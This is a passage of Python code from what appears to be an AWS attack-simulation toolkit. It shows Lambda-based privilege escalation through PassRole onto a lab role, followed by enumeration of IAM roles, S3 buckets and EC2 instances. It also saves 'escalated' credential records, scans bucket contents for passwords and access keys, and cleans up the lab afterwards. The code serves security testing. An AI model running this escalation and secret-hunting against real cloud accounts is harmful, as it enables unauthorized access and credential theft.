            deployment_data = self._load_latest_deployment()
            if not deployment_data:
                return None
                
            arns = deployment_data.get("ARNs", {})
            
            # Look for the DevTeamGroupRole (Lambda execution role)
            role_logical_ids = ["DevTeamGroupRole", "DevTeamLambdaRole", "LambdaExecutionRole"]
            
            for logical_id in role_logical_ids:
                if logical_id in arns:
                    role_arn = arns[logical_id]
                    if isinstance(role_arn, str) and "arn:aws:iam" in role_arn:
                        return role_arn
                        
            print("[WARNING] Could not find target Lambda role in deployment data")
            return None
            
        except Exception as e:
            self.logger.error(
                f"Failed to get target Lambda role: {str(e)}",
                suggestion="Verify deployment data file exists and contains valid role information"
            )
            return None
            
    def _create_lambda_function(self, session, role_arn):
        """Create Lambda function with elevated permissions"""
        try:
            from botocore.exceptions import ClientError
            lambda_client = session.client('lambda')
            
            # Generate unique function name
            timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
            function_name = f"privesc-validation-{timestamp}"
            
            print(f"[INFO] Creating Lambda function: {function_name}")
            print(f"[INFO] Using role: {role_arn}")
            
            # Read the lambda function code
            lambda_code = self._prepare_lambda_code()
            if not lambda_code:
                return None
                
            # Create the Lambda function (without tags to avoid TagResource permission issue)
            response = lambda_client.create_function(
                FunctionName=function_name,
                Runtime='python3.9',
                Role=role_arn,
                Handler='lambda_function.lambda_handler',
                Code={'ZipFile': lambda_code},
                Description='Privilege escalation validation function',
                Timeout=30,
                MemorySize=128
            )
            
            self.logger.success(f"Lambda function created: {response['FunctionArn']}")
            
            # Wait a moment for the function to be ready
            time.sleep(2)
            
            return function_name
            
        except ClientError as e:
            error_code = e.response['Error']['Code']
            error_message = e.response['Error']['Message']
            
            if error_code == 'AccessDenied':
                self.logger.error(
                    f"Access denied creating Lambda function: {error_message}",
                    suggestion="Ensure IAM user/role has lambda:CreateFunction permission. Check AWS policy attachments."
                )
            elif error_code == 'InvalidParameterValueException':
                self.logger.error(
                    f"Invalid parameter: {error_message}",
                    suggestion="Verify the IAM role ARN is valid and ensure iam:PassRole permission is granted"
                )
            else:
                self.logger.error(
                    f"Lambda creation failed ({error_code}): {error_message}",
                    suggestion="Check AWS service limits and IAM permissions. Verify Lambda runtime compatibility."
                )
                
            return None
            
        except Exception as e:
            self.logger.error(
                f"Failed to create Lambda function: {str(e)}",
                suggestion="Verify AWS permissions and Lambda service limits"
            )
            return None
            
    def _prepare_lambda_code(self):
        """Prepare Lambda function code as a ZIP file"""
        try:
            import zipfile
            import io
            
            # Read the lambda_function.py file
            lambda_file_path = Path("payloads/lambda/lambda_function.py")
            if not lambda_file_path.exists():
                self.logger.error(
                    "lambda_function.py not found in payloads/lambda/",
                    suggestion="Ensure the Lambda payload file exists in the payloads/lambda/ directory"
                )
                return None
                
            with open(lambda_file_path, 'r') as f:
                lambda_code = f.read()
                
            # Create ZIP file in memory
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                zip_file.writestr('lambda_function.py', lambda_code)
                
            zip_buffer.seek(0)
            return zip_buffer.read()
            
        except Exception as e:
            self.logger.error(
                f"Failed to prepare Lambda code: {str(e)}",
                suggestion="Check file access permissions and ZIP creation capabilities"
            )
            return None
            
    def _validate_escalation_via_lambda(self, session, function_name):
        """Validate privilege escalation by invoking the Lambda function"""
        try:
            lambda_client = session.client('lambda')
            
            print(f"\n[INFO] Validating privilege escalation via Lambda invocation...")
            
            # Test different actions to demonstrate escalated privileges
            test_actions = [
                ('sts_get_identity', 'Get Lambda identity (should show elevated role)'),
                ('list_roles', 'List IAM roles (test IAM permissions)'), 
                ('list_s3_buckets', 'List S3 buckets (test S3 permissions)'),
                ('list_ec2_instances', 'List EC2 instances (test EC2 permissions)')
            ]
            
            escalation_results = {}
            
            for action, description in test_actions:
                print(f"[INFO] Testing: {description}")
                
                try:
                    # Invoke Lambda with the specific action
                    payload = json.dumps({'action': action})
                    
                    response = lambda_client.invoke(
                        FunctionName=function_name,
                        InvocationType='RequestResponse',
                        Payload=payload
                    )
                    
                    # Parse response
                    response_payload = json.loads(response['Payload'].read())
                    status_code = response_payload.get('statusCode', 500)
                    
                    if status_code == 200:
                        body = json.loads(response_payload['body'])
                        escalation_results[action] = {
                            'success': True,
                            'result': body
                        }
                        self.logger.success(f"{action} completed successfully")
                        
                        # Show detailed results with security findings
                        if action == 'sts_get_identity':
                            arn = body.get('Arn', 'Unknown')
                            print(f"[INFO] Lambda identity: {arn}")
                            
                        elif action == 'list_s3_buckets' and isinstance(body, list):
                            print(f"[INFO] Found {len(body)} S3 bucket(s) total")
                            
                            # Filter and highlight lambda-testing-toolkit buckets
                            target_buckets = [b for b in body if 'lambda-testing-toolkit' in b]
                            if target_buckets:
                                self.logger.security_event(
                                    SecurityEventType.PRIVILEGE_ESCALATION, "HIGH",
                                    f"PRIVILEGE ESCALATION: {len(target_buckets)} sensitive S3 bucket(s) accessible via escalated Lambda role",
                                    details={"buckets_count": len(target_buckets), "risk_level": "HIGH"}
                                )
                                for bucket in target_buckets:
                                    self.logger.security_event(SecurityEventType.PRIVILEGE_ESCALATION, "HIGH", f"Target Bucket Accessible: {bucket}")
                                escalation_results[action]['target_buckets'] = target_buckets
                                escalation_results[action]['security_risk'] = 'HIGH - Sensitive data buckets accessible'
                            else:
                                print(f"[INFO] No lambda-testing-toolkit buckets found")
                                escalation_results[action]['security_risk'] = 'LOW - No sensitive buckets found'
                                
                        elif action == 'list_roles' and isinstance(body, list):
                            print(f"[INFO] Found {len(body)} IAM role(s)")
                            
                            # Check for privileged roles
                            privileged_roles = [r for r in body if any(keyword in r.lower() for keyword in ['admin', 'power', 'full', 'root'])]
                            if privileged_roles:
                                self.logger.security_event(
                                    SecurityEventType.PRIVILEGE_ESCALATION, "HIGH",
                                    f"PRIVILEGE ESCALATION: {len(privileged_roles)} privileged IAM role(s) enumerable via escalated Lambda",
                                    details={"privileged_roles_count": len(privileged_roles), "risk_level": "HIGH"}
                                )
                                for role in privileged_roles[:3]:  # Show first 3
                                    self.logger.security_event(SecurityEventType.PRIVILEGE_ESCALATION, "HIGH", f"Privileged Role Discovered: {role}")
                                escalation_results[action]['privileged_roles'] = privileged_roles
                                escalation_results[action]['security_risk'] = 'HIGH - Administrative roles accessible'
                            else:
                                escalation_results[action]['security_risk'] = 'MEDIUM - Standard roles only'
                                
                        elif action == 'list_ec2_instances':
                            # Ensure body is properly formatted as a list
                            instance_list = []
                            if isinstance(body, list):
                                instance_list = body
                            elif isinstance(body, str):
                                # Sometimes the response might be a string instead of parsed JSON
                                try:
                                    # Try to parse string as JSON
                                    parsed = json.loads(body)
                                    if isinstance(parsed, list):
                                        instance_list = parsed
                                    else:
                                        instance_list = [body]  # Treat as a single item
                                except json.JSONDecodeError:
                                    instance_list = [body]  # Not JSON, treat as a single item
                            else:
                                # Any other type, just wrap in a list
                                instance_list = [str(body)]
                                
                            print(f"[INFO] Found {len(instance_list)} EC2 instance(s)")
                            
                            if instance_list:
                                self.logger.security_event(
                                    SecurityEventType.LATERAL_MOVEMENT, "MEDIUM",
                                    f"LATERAL MOVEMENT RISK: {len(instance_list)} EC2 instance(s) enumerable via escalated Lambda role",
                                    details={"instances_count": len(instance_list), "risk_level": "MEDIUM"}
                                )
                                for instance in instance_list[:3]:  # Show first 3
                                    if isinstance(instance, dict):
                                        instance_id = instance.get('InstanceId', 'Unknown')
                                        # Safely access nested state dictionary
                                        state = 'Unknown'
                                        if isinstance(instance.get('State'), dict):
                                            state = instance['State'].get('Name', 'Unknown')
                                        self.logger.security_event(SecurityEventType.LATERAL_MOVEMENT, "MEDIUM", f"EC2 Instance Discovered: {instance_id} ({state})")
                                    else:
                                        self.logger.security_event(SecurityEventType.LATERAL_MOVEMENT, "MEDIUM", f"EC2 Instance Discovered: {instance}")
                                escalation_results[action]['security_risk'] = 'MEDIUM - EC2 instances enumerable'
                            else:
                                escalation_results[action]['security_risk'] = 'LOW - No EC2 instances found'
                            
                    else:
                        escalation_results[action] = {
                            'success': False,
                            'error': response_payload.get('body', 'Unknown error')
                        }
                        print(f"[WARNING] {action} failed with status {status_code}")
                        
                except Exception as e:
                    escalation_results[action] = {
                        'success': False,
                        'error': str(e)
                    }
                    self.logger.error(
                        f"{action} failed: {str(e)}",
                        suggestion="Check Lambda function execution logs and verify IAM role permissions"
                    )
                    
                # Small delay between invocations
                time.sleep(1)
                
            # Save escalation results and extract Lambda credentials 
            self._save_escalation_results(escalation_results)
            
            # Extract and save escalated Lambda credentials for Option 8
            lambda_credentials = self._extract_lambda_credentials_from_results(escalation_results)
            if lambda_credentials:
                self._save_lambda_session_credentials(lambda_credentials)
                print(f"[INFO] Escalated Lambda credentials saved for use in Option 8")
            else:
                print(f"[WARNING] Could not extract escalated credentials from Lambda execution")
            
            # Count successful escalations
            successful_actions = sum(1 for result in escalation_results.values() if result.get('success', False))
            total_actions = len(test_actions)
            
            print(f"\n[INFO] Privilege escalation validation complete: {successful_actions}/{total_actions} actions successful")
            
            # Return True if at least half the actions were successful
            return successful_actions >= (total_actions // 2)
            
        except Exception as e:
            self.logger.error(
                f"Failed to validate escalation: {str(e)}",
                suggestion="Check Lambda function creation and invocation permissions. Verify network connectivity."
            )
            return False
            
    def _save_escalation_results(self, results):
        """Save privilege escalation results to file"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_file = f"lambda_privesc_results_{timestamp}.json"
        
        try:
            result_data = {
                'timestamp': datetime.now().isoformat(),
                'test_type': 'lambda_privilege_escalation',
                'results': results,
                'summary': {
                    'total_tests': len(results),
                    'successful_tests': sum(1 for r in results.values() if r.get('success', False)),
                    'failed_tests': sum(1 for r in results.values() if not r.get('success', False))
                }
            }
            
            with open(output_file, 'w') as f:
                json.dump(result_data, f, indent=2)
                
            print(f"[INFO] Escalation results saved to: {output_file}")
            
        except Exception as e:
            self.logger.error(
                f"Failed to save escalation results: {str(e)}",
                suggestion="Check disk space and write permissions for the current directory"
            )
            
    def _cleanup_lambda_function(self, session, function_name):
        """Clean up the created Lambda function"""
        try:
            lambda_client = session.client('lambda')
            
            print(f"[INFO] Cleaning up Lambda function: {function_name}")
            
            lambda_client.delete_function(FunctionName=function_name)
            
            self.logger.success(f"Lambda function {function_name} deleted successfully")
            
        except Exception as e:
            print(f"[WARNING] Failed to clean up Lambda function {function_name}: {str(e)}")
            print(f"[INFO] You may need to manually delete this function later")
            
    def _load_latest_lambda_results(self):
        """Load the most recent Lambda privilege escalation results"""
        try:
            # Find Lambda escalation result files
            result_files = list(Path(".").glob("lambda_privesc_results_*.json"))
            
            if not result_files:
                return None
                
            # Get the most recent file
            latest_file = max(result_files, key=os.path.getctime)
            
            with open(latest_file, 'r') as f:
                return json.load(f)
                
        except Exception as e:
            self.logger.error(
                f"Failed to load Lambda results: {str(e)}",
                suggestion="Verify Lambda privilege escalation (Option 8) has been completed successfully"
            )
            return None
            
    def _extract_target_buckets_from_results(self, lambda_results):
        """Extract lambda-testing-toolkit bucket names from Lambda escalation results"""
        try:
            target_buckets = []
            
            # Look for S3 bucket results in the Lambda escalation data
            results = lambda_results.get('results', {})
            s3_results = results.get('list_s3_buckets', {})
            
            if s3_results.get('success', False):
                # Check if there are target buckets stored
                if 'target_buckets' in s3_results:
                    target_buckets = s3_results['target_buckets']
                else:
                    # Fall back to checking all bucket results
                    all_buckets = s3_results.get('result', [])
                    if isinstance(all_buckets, list):
                        target_buckets = [b for b in all_buckets if 'lambda-testing-toolkit' in b]
                        
            return target_buckets
            
        except Exception as e:
            self.logger.error(
                f"Failed to extract lambda-testing-toolkit buckets: {str(e)}",
                suggestion="Check Lambda escalation results format and ensure S3 bucket enumeration completed"
            )
            return []
            
    def _extract_lambda_credentials_from_results(self, escalation_results):
        """Extract escalated Lambda credentials from privilege escalation results"""
        try:
            # For now, we'll simulate extracting the escalated Lambda role credentials
            # In a real attack, this would involve getting the Lambda execution role's credentials
            # which could be obtained through the Lambda service itself or via AssumeRole
            
            # Check if STS identity call was successful (indicates we have working Lambda role)
            sts_results = escalation_results.get('sts_get_identity', {})
            if sts_results.get('success', False):
                lambda_session_arn = sts_results.get('result', {}).get('Arn', '')
                if lambda_session_arn and 'assumed-role' in lambda_session_arn.lower():
                    # Convert session ARN to base role ARN
                    # From: arn:aws:sts::account:assumed-role/RoleName/SessionName
                    # To:   arn:aws:iam::account:role/RoleName
                    base_role_arn = self._convert_session_arn_to_role_arn(lambda_session_arn)
                    
                    # Get the role name from the ARN
                    role_name = self._extract_role_name_from_arn(lambda_session_arn)
                    
                    return {
                        'lambda_role_arn': base_role_arn,
                        'lambda_session_arn': lambda_session_arn,
                        'lambda_role_name': role_name,
                        'escalation_timestamp': datetime.now().isoformat(),
                        'escalated': True,
                        'source': 'lambda_privilege_escalation'
                    }
                    
            return None
            
        except Exception as e:
            self.logger.error(
                f"Failed to extract Lambda credentials: {str(e)}",
                suggestion="Check Lambda privilege escalation results and STS identity information"
            )
            return None
            
    def _extract_role_name_from_arn(self, arn):
        """Extract role name from IAM role ARN"""
        try:
            # ARN format: arn:aws:iam::account:role/RoleName
            if '/role/' in arn:
                return arn.split('/role/')[-1]
            elif '/assumed-role/' in arn:
                # For assumed roles: arn:aws:sts::account:assumed-role/RoleName/SessionName
                parts = arn.split('/assumed-role/')[-1].split('/')
                if len(parts) >= 1:
                    return parts[0]
            return "Unknown"
        except Exception:
            return "Unknown"
            
    def _convert_session_arn_to_role_arn(self, session_arn):
        """Convert assumed role session ARN to base IAM role ARN"""
        try:
            # Convert from: arn:aws:sts::123456789012:assumed-role/RoleName/SessionName
            # To:           arn:aws:iam::123456789012:role/RoleName
            if 'assumed-role' in session_arn:
                # Extract account ID
                account_match = session_arn.split(':')[4]  # 5th element is account
                # Extract role name (part after assumed-role/ and before next /)
                role_part = session_arn.split('/assumed-role/')[-1]
                role_name = role_part.split('/')[0]  # First part is role name
                
                # Construct base role ARN
                base_role_arn = f"arn:aws:iam::{account_match}:role/{role_name}"
                return base_role_arn
            else:
                # If it's already a role ARN, return as-is
                return session_arn
        except Exception as e:
            self.logger.error(
                f"Failed to convert session ARN: {str(e)}",
                suggestion="Check ARN format and ensure it contains valid AWS account and role information"
            )
            return session_arn
            
    def _save_lambda_session_credentials(self, credentials):
        """Save escalated Lambda session credentials for use in Option 8"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_file = f"lambda_escalated_session_{timestamp}.json"
        
        try:
            session_data = {
                'timestamp': datetime.now().isoformat(),
                'session_type': 'lambda_escalated_credentials',
                'credentials': credentials,
                'status': 'active',
                'usage_instructions': 'These credentials represent escalated Lambda role access for Option 8 S3 operations'
            }
            
            with open(output_file, 'w') as f:
                json.dump(session_data, f, indent=2)
                
            print(f"[INFO] Lambda session credentials saved to: {output_file}")
            return output_file
            
        except Exception as e:
            self.logger.error(
                f"Failed to save Lambda session credentials: {str(e)}",
                suggestion="Check disk space and write permissions for credential files"
            )
            return None
            
    def _load_lambda_session_credentials(self):
        """Load the most recent escalated Lambda session credentials"""
        try:
            # Find Lambda session credential files
            session_files = list(Path(".").glob("lambda_escalated_session_*.json"))
            
            if not session_files:
                return None
                
            # Get the most recent file
            latest_file = max(session_files, key=os.path.getctime)
            
            with open(latest_file, 'r') as f:
                return json.load(f)
                
        except Exception as e:
            self.logger.error(
                f"Failed to load Lambda session credentials: {str(e)}",
                suggestion="Ensure Lambda privilege escalation (Option 8) completed and saved credentials"
            )
            return None
            
    def cleanup_deployment(self):
        """Clean up AWS resources and local files with enhanced S3 bucket cleanup"""
        # Find latest deployment
        deployment_files = list(Path(".").glob("resources-*.json"))
        
        if not deployment_files:
            self.logger.error(
                "No deployment files found. Cannot determine what to clean up.",
                suggestion="Deploy infrastructure first using Option 1, or check for existing resource files"
            )
            return False
            
        # Use most recent deployment file
        latest_deployment = max(deployment_files, key=os.path.getctime)
        
        try:
            with open(latest_deployment, "r") as f:
                deployment_data = json.load(f)
                
            stack_name = deployment_data.get("StackName")
            if not stack_name:
                self.logger.error(
                    "Stack name not found in deployment file.",
                    suggestion="The deployment file may be corrupted. Try redeploying infrastructure using Option 1."
                )
                return False
                
        except Exception as e:
            self.logger.error(
                f"Failed to read deployment file: {str(e)}",
                suggestion="Check file permissions and ensure the deployment file is not corrupted"
            )
            return False
            
        # Analyze what needs to be cleaned up
        print(f"\n🗑️ COMPREHENSIVE CLEANUP OPERATION")
        print(f"Stack to delete: {stack_name}")
        print(f"Deployment file: {latest_deployment}")
        
        # Check for S3 buckets that need to be emptied first
        s3_buckets = self._get_s3_buckets_from_deployment(deployment_data)
        lambda_functions = self._get_lambda_functions_from_deployment(deployment_data)
        
        cleanup_details = [
            f"CloudFormation Stack: {stack_name}",
            f"S3 Buckets to empty: {len(s3_buckets)} bucket(s)",
            f"Lambda Functions to delete: {len(lambda_functions)} function(s)",
            f"All AWS resources created by this stack",
            f"Local deployment files and records"
        ]
        
        if s3_buckets:
            print(f"\n⚠️  S3 Buckets found that require emptying:")
            for bucket in s3_buckets:
                print(f"   📦 {bucket}")
                
        if lambda_functions:
            print(f"\n⚠️  Lambda Functions found:")
            for func in lambda_functions:
                print(f"   λ {func}")
        
        # Automatic force cleanup - no submenu
        print("\n🔧 FORCE CLEANUP SELECTED")
        print("Will automatically empty S3 buckets and delete the CloudFormation stack")
        cleanup_mode = '2'  # Force cleanup mode
        
        # Get final confirmation
        if not self.safety_manager.get_user_confirmation("Delete AWS Resources", cleanup_details):
            return False
            
        # Validate operation (dry-run check)
        is_safe, can_proceed = self.safety_manager.validate_operation_safety("cleanup_deployment", 
                                                                              stack_name=stack_name)
        if not can_proceed:
            return False
            
        try:
            # Step 1: Empty S3 buckets if requested
            if cleanup_mode in ['2', '3'] and s3_buckets:
                if not self._empty_s3_buckets(s3_buckets):
                    print("[WARNING] S3 bucket cleanup had some issues, but proceeding...")
            
            # Step 2: Clean up Lambda functions if needed
            if cleanup_mode == '2' and lambda_functions:
                self._cleanup_lambda_functions(lambda_functions)
            
            # Step 3: Delete CloudFormation stack (unless manual S3 cleanup only)
            if cleanup_mode != '3':
                print(f"\n[INFO] Deleting CloudFormation stack: {stack_name}")
                cloudformation.delete_stack(StackName=stack_name)
                
                # Wait for deletion
                print("[INFO] Waiting for stack deletion to complete...")
                waiter = cloudformation.get_waiter("stack_delete_complete")
                waiter.wait(StackName=stack_name)
                
                print(f"[SUCCESS] Stack '{stack_name}' deleted successfully!")
            else:
                print(f"[INFO] S3 buckets emptied. Stack '{stack_name}' preserved as requested.")
            
            # Step 4: Clean up local files
            self._cleanup_local_files(stack_name)
            
            return True
            
        except Exception as e:
            self.logger.error(
                f"Cleanup operation failed: {str(e)}",
                suggestion="Some resources may need manual cleanup in AWS console. Check CloudFormation stack status."
            )
            print(f"[INFO] You may need to manually clean up remaining resources")
            return False
            
    def _get_s3_buckets_from_deployment(self, deployment_data):
        """Extract all S3 bucket names from deployment data"""
        buckets = []
        try:
            resources = deployment_data.get("Resources", [])
            for resource in resources:
                if resource.get("ResourceType") == "AWS::S3::Bucket":
                    bucket_name = resource.get("PhysicalResourceId", "")
                    if bucket_name:
                        buckets.append(bucket_name)
            return buckets
        except Exception as e:
            self.logger.error(
                f"Failed to extract S3 bucket names: {str(e)}",
                suggestion="Check deployment data format and ensure CloudFormation resources are properly recorded"
            )
            return []
            
    def _get_lambda_functions_from_deployment(self, deployment_data):
        """Extract Lambda function names from deployment data"""
        functions = []
        try:
            resources = deployment_data.get("Resources", [])
            for resource in resources:
                if resource.get("ResourceType") == "AWS::Lambda::Function":
                    function_name = resource.get("PhysicalResourceId", "")
                    if function_name:
                        functions.append(function_name)
            return functions
        except Exception as e:
            self.logger.error(
                f"Failed to extract Lambda function names: {str(e)}",
                suggestion="Check deployment data format and ensure Lambda functions are properly recorded"
            )
            return []
            
    def _empty_s3_buckets(self, bucket_names):
        """Empty all objects from the specified S3 buckets"""
        import boto3
        from botocore.exceptions import ClientError
        
        if not bucket_names:
            return True
            
        print(f"\n🗑️ EMPTYING S3 BUCKETS")
        print(f"This will delete all objects in {len(bucket_names)} bucket(s)")
        
        s3_client = self.aws_manager.session.client('s3')
        s3_resource = self.aws_manager.session.resource('s3')
        
        total_objects_deleted = 0
        buckets_emptied = 0
        
        for bucket_name in bucket_names:
            try:
                print(f"\n[INFO] Emptying bucket: {bucket_name}")
                
                # Get bucket reference
                bucket = s3_resource.Bucket(bucket_name)
                
                # Count objects first
                try:
                    object_count = sum(1 for _ in bucket.objects.all())
                    if object_count == 0:
                        print(f"  ✅ Bucket is already empty")
                        buckets_emptied += 1
                        continue
                    else:
                        print(f"  📊 Found {object_count} object(s) to delete")
                except Exception as e:
                    print(f"  [WARNING] Could not count objects: {str(e)}")
                
                # Delete all objects (including versions if versioning is enabled)
                try:
                    # First, delete all object versions if versioning is enabled
                    print(f"  🔄 Deleting object versions...")
                    bucket.object_versions.delete()
                    
                    # Then delete all current objects
                    print(f"  🔄 Deleting current objects...")
                    bucket.objects.all().delete()
                    
                    # Verify bucket is empty
                    remaining_objects = sum(1 for _ in bucket.objects.all())
                    if remaining_objects == 0:
                        print(f"  ✅ Bucket emptied successfully")
                        buckets_emptied += 1
                        total_objects_deleted += object_count
                    else:
                        print(f"  ⚠️  Warning: {remaining_objects} objects remain")
                        
                except Exception as e:
                    print(f"  ❌ Failed to empty bucket: {str(e)}")
                    
                    # Try alternative approach - manual deletion
                    try:
                        print(f"  🔄 Attempting manual object deletion...")
                        objects_to_delete = []
                        
                        # List all objects in batches
                        paginator = s3_client.get_paginator('list_objects_v2')
                        pages = paginator.paginate(Bucket=bucket_name)
                        
                        for page in pages:
                            if 'Contents' in page:
                                for obj in page['Contents']:
                                    objects_to_delete.append({'Key': obj['Key']})
                                    
                                # Delete in batches of 1000 (AWS limit)
                                if len(objects_to_delete) >= 1000:
                                    s3_client.delete_objects(
                                        Bucket=bucket_name,
                                        Delete={'Objects': objects_to_delete}
                                    )
                                    total_objects_deleted += len(objects_to_delete)
                                    print(f"    🗑️  Deleted batch of {len(objects_to_delete)} objects")
                                    objects_to_delete = []
                        
                        # Delete remaining objects
                        if objects_to_delete:
                            s3_client.delete_objects(
                                Bucket=bucket_name,
                                Delete={'Objects': objects_to_delete}
                            )
                            total_objects_deleted += len(objects_to_delete)
                            print(f"    🗑️  Deleted final batch of {len(objects_to_delete)} objects")
                            
                        print(f"  ✅ Manual deletion completed")
                        buckets_emptied += 1
                        
                    except Exception as e2:
                        print(f"  ❌ Manual deletion also failed: {str(e2)}")
                        
            except ClientError as e:
                error_code = e.response['Error']['Code']
                if error_code == 'NoSuchBucket':
                    print(f"  ℹ️  Bucket {bucket_name} no longer exists")
                    buckets_emptied += 1
                else:
                    print(f"  ❌ AWS Error ({error_code}): {e.response['Error']['Message']}")
            except Exception as e:
                print(f"  ❌ Unexpected error: {str(e)}")
                
        print(f"\n[INFO] S3 Cleanup Summary:")
        print(f"  📦 Buckets processed: {len(bucket_names)}")
        print(f"  ✅ Buckets emptied successfully: {buckets_emptied}")
        print(f"  🗑️  Total objects deleted: {total_objects_deleted}")
        
        if buckets_emptied < len(bucket_names):
            print(f"  ⚠️  {len(bucket_names) - buckets_emptied} bucket(s) had issues")
            print(f"  [INFO] CloudFormation may still fail to delete non-empty buckets")
            return False
        else:
            print(f"  🎉 All S3 buckets emptied successfully!")
            return True
            
    def _cleanup_lambda_functions(self, function_names):
        """Clean up Lambda functions that might not be deleted by CloudFormation"""
        if not function_names:
            return
            
        print(f"\n🔧 LAMBDA FUNCTION CLEANUP")
        print(f"Cleaning up {len(function_names)} Lambda function(s)")
        
        lambda_client = self.aws_manager.session.client('lambda')
        functions_deleted = 0
        
        for function_name in function_names:
            try:
                print(f"  🔄 Deleting Lambda function: {function_name}")
                
                # Check if function exists first
                try:
                    lambda_client.get_function(FunctionName=function_name)
                except lambda_client.exceptions.ResourceNotFoundException:
                    print(f"    ✅ Function {function_name} already deleted")
                    functions_deleted += 1
                    continue
                
                # Delete the function
                lambda_client.delete_function(FunctionName=function_name)
                print(f"    ✅ Function {function_name} deleted successfully")
                functions_deleted += 1
                
            except Exception as e:
                print(f"    ❌ Failed to delete function {function_name}: {str(e)}")
                
        print(f"\n[INFO] Lambda Cleanup Summary:")
        print(f"  🔧 Functions processed: {len(function_names)}")
        print(f"  ✅ Functions deleted: {functions_deleted}")
        
    def _create_temporary_s3_lambda(self, session, role_arn):
        """Create a temporary Lambda function for S3 operations using the builder pattern"""
        try:
            from botocore.exceptions import ClientError
            lambda_client = session.client('lambda')
            
            # Generate unique function name
            timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
            function_name = f"s3-enum-temp-{timestamp}"
            
            print(f"[INFO] Creating temporary S3 Lambda: {function_name}")
            print(f"[INFO] Using role: {role_arn}")
            
            # Use Lambda builder to create S3 enumeration function
            lambda_code = self.lambda_builder.build_s3_enumeration_lambda()
            if not lambda_code:
                self.logger.error(
                    "Failed to build S3 enumeration Lambda code",
                    suggestion="Check Lambda builder configuration and ensure required dependencies are available"
                )
                return None
                
            # Create the Lambda function
            response = lambda_client.create_function(
                FunctionName=function_name,
                Runtime='python3.9',
                Role=role_arn,
                Handler='lambda_function.lambda_handler',
                Code={'ZipFile': lambda_code},
                Description='Temporary S3 enumeration function for privilege escalation',
                Timeout=300,  # 5 minutes for S3 operations
                MemorySize=512
            )
            
            self.logger.success(f"Temporary S3 Lambda created: {response['FunctionArn']}")
            
            # Wait a moment for the function to be ready
            time.sleep(3)
            
            return function_name
            
        except ClientError as e:
            error_code = e.response['Error']['Code']
            error_message = e.response['Error']['Message']
            
            if error_code == 'AccessDenied':
                self.logger.error(
                    f"Access denied creating Lambda: {error_message}",
                    suggestion="Ensure EC2 role has lambda:CreateFunction permission in IAM policies"
                )
                print("[INFO] Ensure EC2 role has lambda:CreateFunction permission")
            elif error_code == 'InvalidParameterValueException':
                self.logger.error(
                    f"Invalid parameter: {error_message}",
                    suggestion="Check role ARN validity and ensure iam:PassRole permission is granted"
                )
                print("[INFO] Check role ARN and ensure iam:PassRole permission")
            else:
                self.logger.error(
                    f"Lambda creation failed ({error_code}): {error_message}",
                    suggestion="Check AWS service limits and verify Lambda runtime and memory settings"
                )
                
            return None
            
        except Exception as e:
            self.logger.error(
                f"Failed to create temporary S3 Lambda: {str(e)}",
                suggestion="Verify AWS permissions and service availability for Lambda creation"
            )
            return None
            
    def _lambda_list_s3_buckets(self, session, function_name):
        """Use Lambda to list S3 buckets with escalated permissions"""
        try:
            lambda_client = session.client('lambda')
            
            # Invoke Lambda to list buckets
            payload = json.dumps({'action': 'list_buckets'})
            
            response = lambda_client.invoke(
                FunctionName=function_name,
                InvocationType='RequestResponse',
                Payload=payload
            )
            
            response_payload = json.loads(response['Payload'].read())
            if response_payload.get('statusCode') == 200:
                result = json.loads(response_payload['body'])
                buckets = result.get('buckets', [])
                self.logger.success(f"Lambda found {len(buckets)} S3 buckets")
                return buckets
            else:
                error_info = json.loads(response_payload.get('body', '{}'))
                self.logger.error(
                    f"Lambda failed to list buckets: {error_info.get('error', 'Unknown error')}",
                    suggestion="Check Lambda execution role permissions for S3:ListAllMyBuckets"
                )
                return None
                
        except Exception as e:
            self.logger.error(
                f"Failed to invoke Lambda for bucket listing: {str(e)}",
                suggestion="Check Lambda function exists and has proper invocation permissions"
            )
            return None
            
    def _lambda_enumerate_bucket(self, session, function_name, bucket_name):
        """Use Lambda to enumerate a specific S3 bucket"""
        try:
            lambda_client = session.client('lambda')
            
            # Invoke Lambda to enumerate bucket
            payload = json.dumps({
                'action': 'enumerate_bucket',
                'bucket_name': bucket_name
            })
            
            response = lambda_client.invoke(
                FunctionName=function_name,
                InvocationType='RequestResponse',
                Payload=payload
            )
            
            response_payload = json.loads(response['Payload'].read())
            if response_payload.get('statusCode') == 200:
                bucket_data = json.loads(response_payload['body'])
                return bucket_data
            else:
                error_info = json.loads(response_payload.get('body', '{}'))
                print(f"[WARNING] Lambda failed to enumerate {bucket_name}: {error_info.get('error', 'Unknown error')}")
                return None
                
        except Exception as e:
            self.logger.error(
                f"Failed to invoke Lambda for bucket enumeration: {str(e)}",
                suggestion="Verify Lambda function permissions and S3 bucket access rights"
            )
            return None
            
    def _analyze_bucket_for_sensitive_data(self, bucket_name, bucket_data, findings_list):
        """Analyze bucket data for sensitive information"""
        try:
            # Check bucket metadata for sensitive tags
            metadata = bucket_data.get('metadata', {})
            tags = metadata.get('tags', [])
            
            for tag in tags:
                tag_key = tag.get('Key', '').lower()
                tag_value = tag.get('Value', '').lower()
                
                if any(sensitive in tag_key for sensitive in ['classification', 'confidential', 'secret', 'pii']):
                    if any(level in tag_value for level in ['confidential', 'secret', 'pii', 'sensitive', 'private']):
                        findings_list.append(f"Bucket {bucket_name} tagged as {tag['Key']}:{tag['Value']} (SENSITIVE)")
                        
            # Check encryption status
            if metadata.get('encryption') == 'Disabled':
                findings_list.append(f"Bucket {bucket_name} has encryption disabled (SECURITY RISK)")
                
            # Check objects for sensitive content patterns
            objects = bucket_data.get('objects', [])
            for obj in objects:
                obj_key = obj.get('key', '').lower()
                content = obj.get('content', '')
                
                # Check filenames for sensitive patterns
                sensitive_patterns = ['password', 'secret', 'key', 'credential', 'config', 'env', 'private']
                if any(pattern in obj_key for pattern in sensitive_patterns):
                    findings_list.append(f"Sensitive file found: {bucket_name}/{obj['key']} (filename pattern)")
                    
                # Check content for sensitive data patterns
                if content and isinstance(content, str):
                    content_lower = content.lower()
                    if any(pattern in content_lower for pattern in ['password=', 'secret=', 'api_key=', 'aws_access_key']):
                        findings_list.append(f"Sensitive content found: {bucket_name}/{obj['key']} (credential data)")
                        
        except Exception as e:
            self.logger.error(
                f"Failed to analyze bucket {bucket_name}: {str(e)}",
